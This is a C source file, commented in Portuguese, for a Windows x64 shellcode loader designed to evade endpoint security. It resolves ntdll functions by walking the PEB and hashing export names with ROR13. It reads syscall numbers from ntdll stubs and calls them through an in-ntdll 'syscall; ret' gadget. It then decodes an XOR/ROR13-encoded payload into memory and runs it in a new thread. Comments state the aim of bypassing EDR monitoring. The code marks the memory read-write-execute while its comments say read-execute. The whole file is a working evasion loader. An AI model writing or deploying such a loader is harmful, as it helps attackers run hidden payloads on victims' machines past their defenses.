/*
 * loader.c - Shellcode Loader com Evasao Avancada
 *
 * Fluxo principal:
 *   1. PEB Walking -> encontra ntdll.dll e kernel32.dll
 *   2. Export Table Walking com ROR13 Hash -> resolve funcoes Nt*
 *   3. Extrai SSNs e encontra gadget "syscall; ret" no ntdll
 *   4. IAT Walking -> resolve APIs criticas via Import Address Table
 *   5. Decodifica shellcode (ROL13 + XOR)
 *   6. NtAllocateVirtualMemory (indirect syscall) -> RW memory
 *   7. Copia shellcode decodificado
 *   8. NtProtectVirtualMemory (indirect syscall) -> RX memory
 *   9. NtCreateThreadEx (indirect syscall) -> executa shellcode
 *  10. NtWaitForSingleObject (indirect syscall) -> aguarda
 *
 * Nenhuma API sensivel e importada diretamente no IAT do loader.
 * Toda resolucao e feita via PEB + Export Table.
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "loader.h"

/* Shellcode encoded (gerado por encode.py) */
#include "shellcode.h"

/* ============================================================
 * ROR13 Hashing
 * ============================================================ */

/*
 * Hash ROR13 padrao (usado por Metasploit, Cobalt Strike, etc.)
 * Cada byte: hash = ROR13(hash) + byte
 */
DWORD Ror13HashA(const char *str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash >> 13) | (hash << 19)) + (BYTE)*str++;
    }
    return hash;
}

/*
 * Hash ROR13 para strings Unicode (modulos no PEB usam UNICODE_STRING)
 */
DWORD Ror13HashW(const WCHAR *str) {
    DWORD hash = 0;
    while (*str) {
        WCHAR ch = *str++;
        /* Converte para minuscula ASCII (nomes de DLL sao case-insensitive) */
        if (ch >= L'A' && ch <= L'Z') ch += 32;
        hash = ((hash >> 13) | (hash << 19)) + (BYTE)ch;
    }
    return hash;
}

/* ============================================================
 * PEB Walking - Encontrar Modulos
 * ============================================================ */

/*
 * Percorre o PEB via GS:[0x60] e busca o modulo pelo hash do nome.
 *
 * Cadeia: GS:[0x60] -> PEB -> Ldr (offset 0x18)
 *         -> InMemoryOrderModuleList (offset 0x20)
 *         -> Cada entrada: DllBase (offset 0x30), BaseDllName (offset 0x58)
 *
 * Vantagem: nao usa GetModuleHandleA/GetProcAddress (monitorados por EDR)
 */
PVOID FindModuleByHash(DWORD moduleHash) {
    /*
     * Le PEB via GS:0x60 (portavel MSVC/MinGW).
     * O PEB esta sempre mapeado em processos Windows x64, entao a leitura
     * direta e segura. Validamos o ponteiro antes de usa-lo.
     */
    PVOID peb = READ_GS_QWORD(PEB_OFFSET);

    if (!peb) return NULL;

    /* Acessa PEB->Ldr */
    PMY_PEB_LDR_DATA ldr = *(PMY_PEB_LDR_DATA *)((BYTE *)peb + PEB_LDR_OFFSET);
    if (!ldr) return NULL;

    /* Percorre InMemoryOrderModuleList */
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        /* Converte InMemoryOrderLinks para LDR_DATA_TABLE_ENTRY */
        PMY_LDR_DATA_TABLE_ENTRY entry =
            (PMY_LDR_DATA_TABLE_ENTRY)((BYTE *)curr - LDR_ENTRY_IN_MEMORY_ORDER);

        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
            /* Hash do nome do modulo (sem .dll para flexibilidade) */
            DWORD hash = Ror13HashW(entry->BaseDllName.Buffer);
            if (hash == moduleHash) {
                return entry->DllBase;
            }
        }

        curr = curr->Flink;
    }

    return NULL;
}

/* ============================================================
 * Export Table Walking - Resolver Funcoes por Hash
 * ============================================================ */

/*
 * Percorre a Export Table de um modulo e encontra uma funcao pelo hash.
 *
 * Estrutura: DOS Header -> e_lfanew -> NT Headers
 *            -> OptionalHeader -> DataDirectory[0] = Export Directory
 *            -> AddressOfNames, AddressOfNameOrdinals, AddressOfFunctions
 *
 * Para cada nome: Ror13Hash(nome) == funcHash ?
 * Se sim: retorna AddressOfFunctions[ordinal]
 *
 * Vantagem: nao ha strings ASCII com nomes de API no binario
 */
PVOID ResolveExportByHash(PVOID moduleBase, DWORD funcHash) {
    if (!moduleBase) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    /* Diretorio de Exportacao (indice 0) */
    IMAGE_DATA_DIRECTORY *exportDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir->VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDir->VirtualAddress);

    DWORD  numOfNames    = exports->NumberOfNames;
    DWORD  *addrOfNames  = (DWORD *)((BYTE *)moduleBase + exports->AddressOfNames);
    WORD   *addrOfOrds   = (WORD *)((BYTE *)moduleBase + exports->AddressOfNameOrdinals);
    DWORD  *addrOfFuncs  = (DWORD *)((BYTE *)moduleBase + exports->AddressOfFunctions);

    for (DWORD i = 0; i < numOfNames; i++) {
        const char *funcName = (const char *)((BYTE *)moduleBase + addrOfNames[i]);

        if (Ror13HashA(funcName) == funcHash) {
            DWORD funcRva = addrOfFuncs[addrOfOrds[i]];

            /* Verifica se e um forwarder (dentro do diretorio de exports) */
            if (funcRva >= exportDir->VirtualAddress &&
                funcRva < exportDir->VirtualAddress + exportDir->Size) {
                /* Forwarder: "otherdll.FunctionName" - simplificacao: nao resolve */
                return NULL;
            }

            return (PVOID)((BYTE *)moduleBase + funcRva);
        }
    }

    return NULL;
}

/* ============================================================
 * SSN Extraction - Ler System Service Number do ntdll
 * ============================================================ */

/*
 * Cada funcao Nt* no ntdll tem um stub padrao:
 *
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX XX XX    mov eax, <SSN>
 *   0F 05             syscall
 *   C3                ret
 *
 * Le os 8 primeiros bytes e extrai o SSN (offset 4, 4 bytes LE).
 * Isso funciona em qualquer versao do Windows porque lemos o codigo real.
 */
DWORD ExtractSSN(PVOID ntFunction) {
    if (!ntFunction) return 0;

    BYTE *code = (BYTE *)ntFunction;

    /* Verifica o prologo padrao: mov r10, rcx (4C 8B D1) */
    if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1) {
        /* B8 XX XX XX XX = mov eax, SSN */
        if (code[3] == 0xB8) {
            DWORD ssn = *(DWORD *)(code + 4);
            return ssn;
        }
    }

    /* Fallback: prologos alternativos (algumas builds do ntdll) */
    /* Tenta buscar mov eax diretamente */
    for (int i = 0; i < 16; i++) {
        if (code[i] == 0xB8 && i + 4 < 32) {
            DWORD ssn = *(DWORD *)(code + i + 1);
            /* SSNs sao tipicamente < 0x200 em x64 */
            if (ssn < 0x300) return ssn;
        }
    }

    return 0;
}

/* ============================================================
 * Syscall Gadget - Encontrar "syscall; ret" no ntdll
 * ============================================================ */

/*
 * Busca na secao .text do ntdll o byte sequence: 0F 05 C3 (syscall; ret)
 *
 * Por que usamos o gadget do ntdll?
 *   - EDR/AV monitoram se "syscall" executa de endereços fora do ntdll
 *   - Ao saltar para o gadget, o "syscall" executa de dentro do ntdll
 *   - Isso passa por verificacoes de integridade de usermode hooks
 */
PVOID FindSyscallGadget(PVOID ntdllBase) {
    if (!ntdllBase) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE *)ntdllBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    /* Encontra a secao .text */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* Procura por secao com caractere 'x' (executavel) ou nome .text */
        BOOL isText = FALSE;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            isText = TRUE;
        }

        if (isText) {
            BYTE *start = (BYTE *)ntdllBase + section[i].VirtualAddress;
            DWORD size  = section[i].Misc.VirtualSize;

            /* Busca 0F 05 C3 (syscall; ret) */
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j]     == 0x0F &&
                    start[j + 1] == 0x05 &&
                    start[j + 2] == 0xC3) {
                    return (PVOID)(start + j);
                }
            }
        }

        section++;
    }

    return NULL;
}

/* ============================================================
 * IAT Walking - Resolucao via Import Address Table
 * ============================================================ */

/*
 * Resolve LoadLibraryA e GetProcAddress via IAT do proprio loader.
 * Essas duas APIs sao o minimo necessario para bootstrap antes de
 * usar PEB walking (que nao depende de nenhuma API).
 *
 * Apos o bootstrap, todas as demais resolucoes sao via PEB + Export Table.
 */
BOOL ResolveIAT(PIAT_RESOLVER resolver) {
    if (!resolver) return FALSE;

    /* Usa as APIs importadas normalmente (presentes no IAT do loader) */
    resolver->kernel32Base  = (PVOID)GetModuleHandleA("kernel32.dll");
    resolver->ntdllBase     = (PVOID)GetModuleHandleA("ntdll.dll");

    if (!resolver->kernel32Base || !resolver->ntdllBase) {
        return FALSE;
    }

    resolver->LoadLibraryA   = (PVOID)GetProcAddress(
        (HMODULE)resolver->kernel32Base, "LoadLibraryA");
    resolver->GetProcAddress = (PVOID)GetProcAddress(
        (HMODULE)resolver->kernel32Base, "GetProcAddress");

    return (resolver->LoadLibraryA && resolver->GetProcAddress);
}

/* ============================================================
 * Decodificacao XOR + ROR13
 * ============================================================ */

/*
 * Encoding feito pelo encode.py:
 *   encoded[i] = ROR32(original_dword[i] ^ key, 13)
 *
 * Decodificacao (aqui):
 *   original_dword[i] = ROL32(encoded_dword[i], 13) ^ key
 *
 * ROL e o inverso de ROR, entao ROL13 desfaz ROR13.
 * XOR com a mesma chave desfaz o XOR.
 */
static inline DWORD ROL32(DWORD val, DWORD shift) {
    shift &= 31;
    return ((val << shift) | (val >> (32 - shift)));
}

void DecodeShellcode(BYTE *shellcode, DWORD length, DWORD key) {
    DWORD *dwords = (DWORD *)shellcode;
    DWORD  count  = length / 4;

    for (DWORD i = 0; i < count; i++) {
        /* ROL13 desfaz o ROR13 do encoding */
        DWORD decoded = ROL32(dwords[i], 13);
        /* XOR desfaz o XOR do encoding */
        decoded ^= key;
        dwords[i] = decoded;
    }
}

/* ============================================================
 * Funcao Principal
 * ============================================================ */

int main(void) {
    /* Desabilita buffering de stdout (evita perder log em caso de crash) */
    setvbuf(stdout, NULL, _IONBF, 0);

    /*
     * Cores do console (apenas para log visual)
     * Em operacao real, remover todos os printfs
     */
    printf("[*] Shellcode Loader - Evasao Avancada\n");
    printf("[*] Tecnicas: PEB Walking | ROR13 Hash | Indirect Syscalls | IAT Walking | XOR+ROR13\n\n");

    /* Hashes dos modulos (ROR13 de "ntdll.dll" e "kernel32.dll") */
    DWORD hash_ntdll    = Ror13HashW(L"ntdll.dll");
    DWORD hash_kernel32 = Ror13HashW(L"kernel32.dll");

    printf("[*] Hash ntdll.dll:    0x%08X\n", (unsigned int)hash_ntdll);
    printf("[*] Hash kernel32.dll: 0x%08X\n\n", (unsigned int)hash_kernel32);

    /* ========================================================
     * Passo 1: PEB Walking - Encontrar ntdll.dll
     * ======================================================== */
    printf("[1] PEB Walking -> ntdll.dll ...\n");

    PVOID ntdllBase = FindModuleByHash(hash_ntdll);
    if (!ntdllBase) {
        printf("    [-] Falha ao encontrar ntdll.dll no PEB\n");
        return 1;
    }
    printf("    [+] ntdll.dll em 0x%p\n", ntdllBase);

    /* ========================================================
     * Passo 2: Export Table Walking - Resolver funcoes Nt*
     * ======================================================== */
    printf("[2] Export Table Walking -> funcoes Nt* ...\n");

    /* Hashes das funcoes necessarias */
    DWORD hash_NtAllocateVirtualMemory = Ror13HashA("NtAllocateVirtualMemory");
    DWORD hash_NtProtectVirtualMemory  = Ror13HashA("NtProtectVirtualMemory");
    DWORD hash_NtCreateThreadEx        = Ror13HashA("NtCreateThreadEx");
    DWORD hash_NtWaitForSingleObject   = Ror13HashA("NtWaitForSingleObject");

    PVOID fnNtAllocateVirtualMemory = ResolveExportByHash(ntdllBase, hash_NtAllocateVirtualMemory);
    PVOID fnNtProtectVirtualMemory  = ResolveExportByHash(ntdllBase, hash_NtProtectVirtualMemory);
    PVOID fnNtCreateThreadEx        = ResolveExportByHash(ntdllBase, hash_NtCreateThreadEx);
    PVOID fnNtWaitForSingleObject   = ResolveExportByHash(ntdllBase, hash_NtWaitForSingleObject);

    if (!fnNtAllocateVirtualMemory || !fnNtProtectVirtualMemory ||
        !fnNtCreateThreadEx || !fnNtWaitForSingleObject) {
        printf("    [-] Falha ao resolver funcoes Nt*\n");
        return 1;
    }

    printf("    [+] NtAllocateVirtualMemory em 0x%p\n", fnNtAllocateVirtualMemory);
    printf("    [+] NtProtectVirtualMemory  em 0x%p\n", fnNtProtectVirtualMemory);
    printf("    [+] NtCreateThreadEx        em 0x%p\n", fnNtCreateThreadEx);
    printf("    [+] NtWaitForSingleObject   em 0x%p\n", fnNtWaitForSingleObject);

    /* ========================================================
     * Passo 3: Extrair SSNs das funcoes Nt*
     * ======================================================== */
    printf("[3] Extraindo SSNs ...\n");

    g_SSN_NtAllocateVirtualMemory = ExtractSSN(fnNtAllocateVirtualMemory);
    g_SSN_NtProtectVirtualMemory  = ExtractSSN(fnNtProtectVirtualMemory);
    g_SSN_NtCreateThreadEx        = ExtractSSN(fnNtCreateThreadEx);
    g_SSN_NtWaitForSingleObject   = ExtractSSN(fnNtWaitForSingleObject);

    printf("    [+] SSN NtAllocateVirtualMemory: 0x%X\n", (unsigned int)g_SSN_NtAllocateVirtualMemory);
    printf("    [+] SSN NtProtectVirtualMemory:  0x%X\n", (unsigned int)g_SSN_NtProtectVirtualMemory);
    printf("    [+] SSN NtCreateThreadEx:        0x%X\n", (unsigned int)g_SSN_NtCreateThreadEx);
    printf("    [+] SSN NtWaitForSingleObject:   0x%X\n", (unsigned int)g_SSN_NtWaitForSingleObject);

    if (g_SSN_NtAllocateVirtualMemory == 0 ||
        g_SSN_NtProtectVirtualMemory  == 0 ||
        g_SSN_NtCreateThreadEx        == 0 ||
        g_SSN_NtWaitForSingleObject   == 0) {
        printf("    [-] Falha ao extrair SSNs\n");
        return 1;
    }

    /* ========================================================
     * Passo 4: Encontrar Gadget "syscall; ret" no ntdll
     * ======================================================== */
    printf("[4] Buscando gadget syscall; ret no ntdll ...\n");

    g_SyscallGadget = FindSyscallGadget(ntdllBase);
    if (!g_SyscallGadget) {
        printf("    [-] Falha ao encontrar gadget syscall; ret\n");
        return 1;
    }
    printf("    [+] Gadget em 0x%p\n", g_SyscallGadget);

    /* ========================================================
     * Passo 5: IAT Walking - Bootstrap (opcional, ja feito via imports)
     * ======================================================== */
    printf("[5] IAT Walking -> resolucao de APIs ...\n");

    IAT_RESOLVER iatResolver = {0};
    if (!ResolveIAT(&iatResolver)) {
        printf("    [-] Falha no IAT bootstrap\n");
        return 1;
    }
    printf("    [+] kernel32 em 0x%p\n", iatResolver.kernel32Base);
    printf("    [+] LoadLibraryA em 0x%p\n", iatResolver.LoadLibraryA);
    printf("    [+] GetProcAddress em 0x%p\n", iatResolver.GetProcAddress);

    /* ========================================================
     * Passo 6: Decodificar Shellcode (ROL13 + XOR)
     * ======================================================== */
    printf("[6] Decodificando shellcode (XOR + ROR13) ...\n");

    DWORD shellcodeLen = sizeof(g_encoded_shellcode);
    printf("    [*] Tamanho encoded: %lu bytes\n", shellcodeLen);
    printf("    [*] Chave XOR: 0x%08X\n", XOR_KEY_DEFAULT);

    /* Copia para buffer mutavel */
    BYTE *decodedShellcode = (BYTE *)VirtualAlloc(
        NULL, shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!decodedShellcode) {
        printf("    [-] Falha ao alocar buffer para decodificacao\n");
        return 1;
    }

    CopyMemory(decodedShellcode, g_encoded_shellcode, shellcodeLen);

    /* Aplica ROL13 + XOR */
    DecodeShellcode(decodedShellcode, shellcodeLen, XOR_KEY_DEFAULT);

    printf("    [+] Shellcode decodificado em 0x%p\n", decodedShellcode);

    /* ========================================================
     * Passo 7: Alocar memoria RW via Indirect Syscall
     * ======================================================== */
    printf("[7] NtAllocateVirtualMemory (indirect syscall) -> RW ...\n");

    PVOID execBase = NULL;
    SIZE_T allocSize = shellcodeLen;

    NTSTATUS status = NtAllocateVirtualMemory_Indirect(
        (HANDLE)-1,           /* ProcessHandle: processo atual */
        &execBase,            /* BaseAddress: saida */
        0,                    /* ZeroBits */
        &allocSize,           /* RegionSize */
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status) || !execBase) {
        printf("    [-] NtAllocateVirtualMemory falhou: 0x%08X\n", (unsigned int)status);
        VirtualFree(decodedShellcode, 0, MEM_RELEASE);
        return 1;
    }
    printf("    [+] Memoria RW alocada em 0x%p (%lu bytes)\n", execBase, (DWORD)allocSize);

    /* ========================================================
     * Passo 8: Copiar Shellcode Decodificado
     * ======================================================== */
    printf("[8] Copiando shellcode ...\n");

    CopyMemory(execBase, decodedShellcode, shellcodeLen);

    /* Limpa o buffer temporario de decodificacao */
    SecureZeroMemory(decodedShellcode, shellcodeLen);
    VirtualFree(decodedShellcode, 0, MEM_RELEASE);

    printf("    [+] Shellcode copiado\n");

    /* ========================================================
     * Passo 9: Proteger memoria como RX via Indirect Syscall
     * ======================================================== */
    printf("[9] NtProtectVirtualMemory (indirect syscall) -> RX ...\n");

    ULONG oldProtect = 0;
    SIZE_T protectSize = shellcodeLen;

    status = NtProtectVirtualMemory_Indirect(
        (HANDLE)-1,
        &execBase,
        &protectSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    if (!NT_SUCCESS(status)) {
        printf("    [-] NtProtectVirtualMemory falhou: 0x%08X\n", (unsigned int)status);
        return 1;
    }
    printf("    [+] Protecao alterada para RX (old: 0x%X)\n", (unsigned int)oldProtect);

    /* ========================================================
     * Passo 10: Criar Thread via Indirect Syscall
     * ======================================================== */
    printf("[10] NtCreateThreadEx (indirect syscall) -> executando shellcode ...\n");

    HANDLE hThread = NULL;

    status = NtCreateThreadEx_Indirect(
        &hThread,                    /* ThreadHandle */
        THREAD_ALL_ACCESS,           /* DesiredAccess */
        NULL,                        /* ObjectAttributes */
        (HANDLE)-1,                  /* ProcessHandle: processo atual */
        execBase,                    /* StartRoutine: shellcode */
        NULL,                        /* Argument */
        0,                           /* CreateFlags */
        0,                           /* ZeroBits */
        0,                           /* StackSize */
        0,                           /* MaximumStackSize */
        NULL                         /* AttributeList */
    );

    if (!NT_SUCCESS(status) || !hThread) {
        printf("    [-] NtCreateThreadEx falhou: 0x%08X\n", (unsigned int)status);
        return 1;
    }
    printf("    [+] Thread criada! Handle: 0x%p\n", hThread);

    /* ========================================================
     * Passo 11: Aguardar Thread via Indirect Syscall
     * ======================================================== */
    printf("[11] NtWaitForSingleObject -> aguardando ...\n");

    status = NtWaitForSingleObject_Indirect(
        hThread,
        FALSE,       /* Alertable */
        NULL         /* Timeout: infinito */
    );

    printf("    [+] Thread finalizada: 0x%08X\n", (unsigned int)status);

    /* Cleanup */
    CloseHandle(hThread);

    printf("\n[*] Loader finalizado com sucesso!\n");
    return 0;
}
